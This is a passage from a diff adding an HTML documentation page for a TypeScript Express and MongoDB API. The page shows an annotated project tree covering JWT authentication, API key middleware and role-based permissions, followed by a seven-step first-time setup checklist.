+<span class="prop">│   ├── server.ts</span>               <span class="comment">← Entry point: connects MongoDB, starts HTTP server</span>
+<span class="prop">│   │</span>
+<span class="prop">│   ├── types/</span>
+<span class="prop">│   │   └── express.d.ts</span>        <span class="comment">← Adds req.user: IJwtPayload to Express.Request</span>
+<span class="prop">│   │</span>
+<span class="prop">│   ├── utils/</span>
+<span class="prop">│   │   ├── constants.ts</span>        <span class="comment">← SALT_ROUNDS, API_KEY_BYTES, API_KEY_HEADER, DEFAULT_JWT_EXPIRY</span>
+<span class="prop">│   │   ├── async-handler.util.ts</span> <span class="comment">← Wraps async route handlers, forwards errors to next()</span>
+<span class="prop">│   │   └── response.util.ts</span>    <span class="comment">← sendSuccess() and sendError() standard envelope</span>
+<span class="prop">│   │</span>
+<span class="prop">│   ├── core/</span>                   <span class="comment">← Domain layer — ZERO external dependencies</span>
+<span class="prop">│   │   ├── entities/</span>           <span class="comment">← TypeScript interfaces describing data shape</span>
+<span class="prop">│   │   │   ├── user.entity.ts</span>   <span class="comment">← IUser, IUserDocument, IJwtPayload</span>
+<span class="prop">│   │   │   ├── role.entity.ts</span>   <span class="comment">← IRole, IRoleDocument, IModuleAccess, PermissionAction</span>
+<span class="prop">│   │   │   ├── module.entity.ts</span> <span class="comment">← IModule, IModuleDocument</span>
+<span class="prop">│   │   │   └── api-key.entity.ts</span> <span class="comment">← IApiKey, IApiKeyDocument</span>
+<span class="prop">│   │   ├── dtos/</span>               <span class="comment">← Joi validation schemas + TypeScript DTO interfaces</span>
+<span class="prop">│   │   │   ├── user/</span>           <span class="comment">← create-user, update-user, login DTOs</span>
+<span class="prop">│   │   │   ├── role/</span>           <span class="comment">← create-role, update-role DTOs</span>
+<span class="prop">│   │   │   ├── module/</span>         <span class="comment">← create-module, update-module DTOs</span>
+<span class="prop">│   │   │   └── api-key/</span>        <span class="comment">← create-api-key (name+usage_limit+expires_at), update-api-key</span>
+<span class="prop">│   │   └── abstracts/</span>
+<span class="prop">│   │       ├── data-service.abstract.ts</span>    <span class="comment">← IDataServices interface (all repos)</span>
+<span class="prop">│   │       └── generic-repository.abstract.ts</span> <span class="comment">← IGenericRepository<T> interface</span>
+<span class="prop">│   │</span>
+<span class="prop">│   ├── frameworks/mongo/</span>       <span class="comment">← Infrastructure layer (Mongoose)</span>
+<span class="prop">│   │   ├── model/</span>              <span class="comment">← Mongoose schemas + model() calls</span>
+<span class="prop">│   │   │   ├── user.model.ts</span>
+<span class="prop">│   │   │   ├── role.model.ts</span>
+<span class="prop">│   │   │   ├── module.model.ts</span>
+<span class="prop">│   │   │   └── api-key.model.ts</span>
+<span class="prop">│   │   ├── mongo-generic-repository.ts</span> <span class="comment">← Implements IGenericRepository<T> with Mongoose</span>
+<span class="prop">│   │   └── mongo-data-services.service.ts</span> <span class="comment">← Implements IDataServices, wires all repos</span>
+<span class="prop">│   │</span>
+<span class="prop">│   ├── middlewares/</span>            <span class="comment">← Security chain — runs before every controller</span>
+<span class="prop">│   │   ├── auth.middleware.ts</span>      <span class="comment">← JWT verify (Step1) + DB is_active check (Step2)</span>
+<span class="prop">│   │   ├── api-key.middleware.ts</span>   <span class="comment">← DB key + expiry + usage limit + atomic increment</span>
+<span class="prop">│   │   ├── env-api-key.middleware.ts</span> <span class="comment">← FOR_API_KEY_CREATE_KEY from .env (bootstrap only)</span>
+<span class="prop">│   │   ├── permission.middleware.ts</span> <span class="comment">← RBAC 3-gate check using role from DB</span>
+<span class="prop">│   │   └── error.middleware.ts</span>     <span class="comment">← Global error handler, formats all thrown errors</span>
+<span class="prop">│   │</span>
+<span class="prop">│   ├── use-cases/</span>              <span class="comment">← Business logic — all rules live here</span>
+<span class="prop">│   │   ├── auth/auth.use-case.ts</span>    <span class="comment">← login() + getProfile()</span>
+<span class="prop">│   │   ├── user/user.use-case.ts</span>    <span class="comment">← CRUD + bcrypt hash on create/update</span>
+<span class="prop">│   │   ├── role/role.use-case.ts</span>
+<span class="prop">│   │   ├── module/module.use-case.ts</span>
+<span class="prop">│   │   └── api-key/api-key.use-case.ts</span> <span class="comment">← generate 64-char hex key, validate expiry on create</span>
+<span class="prop">│   │</span>
+<span class="prop">│   ├── controllers/</span>            <span class="comment">← HTTP layer: parse → validate (Joi) → use-case → respond</span>
+<span class="prop">│   ├── routes/</span>                 <span class="comment">← Each module folder: routes.ts + swagger.ts + index.ts</span>
+<span class="prop">│   └── config/swagger.ts</span>       <span class="comment">← Merges all module swagger specs, sets security schemes</span>
+<span class="prop">│</span>
+<span class="prop">├── scripts/</span>
+<span class="prop">│   └── seed-admin.ts</span>           <span class="comment">← Creates super_admin role + admin user + prints JWT token</span>
+<span class="prop">├── docs/</span>
+<span class="prop">│   ├── architecture-guide.html</span> <span class="comment">← CRUD + lookup development guide</span>
+<span class="prop">│   └── auth-system-brd.html</span>    <span class="comment">← This document</span>
+<span class="prop">├── .env</span>                        <span class="comment">← Secrets — NEVER commit to git</span>
+<span class="prop">├── nodemon.json</span>                <span class="comment">← Dev server: ts-node --files server.ts</span>
+<span class="prop">└── tsconfig.json</span>               <span class="comment">← TypeScript config: strict + ES2020 + commonjs</span></pre>
+
+  <h2>First-Time Setup Checklist</h2>
+  <table>
+    <tr><th>Step</th><th>Command / Action</th><th>What you get</th></tr>
+    <tr><td>1</td><td><code>npm install</code></td><td>Install all dependencies</td></tr>
+    <tr><td>2</td><td>Edit <code>.env</code> — change JWT_SECRET and FOR_API_KEY_CREATE_KEY</td><td>Unique secrets for your instance</td></tr>
+    <tr><td>3</td><td><code>npx ts-node scripts/seed-admin.ts</code></td><td>Creates super_admin role + admin user. Prints JWT token.</td></tr>
+    <tr><td>4</td><td><code>npm run dev</code></td><td>Dev server on port 7000. Opens Swagger at <code>/api-docs</code>.</td></tr>
+    <tr><td>5</td><td>Swagger → Authorize → paste JWT token as Bearer</td><td>Swagger now sends JWT on all requests</td></tr>
+    <tr><td>6</td><td>POST /api-keys with body + FOR_API_KEY_CREATE_KEY in x-api-key header</td><td>Your first DB API key. Copy it — shown only once.</td></tr>
+    <tr><td>7</td><td>Swagger → Authorize → paste DB key in apiKeyAuth</td><td>All protected endpoints now accessible</td></tr>
+  </table>
+
+  <div class="page-footer">Made by Nikhil Mahato (Software Development Engineer 1)</div>
+</div>
+
+</body>
+</html>
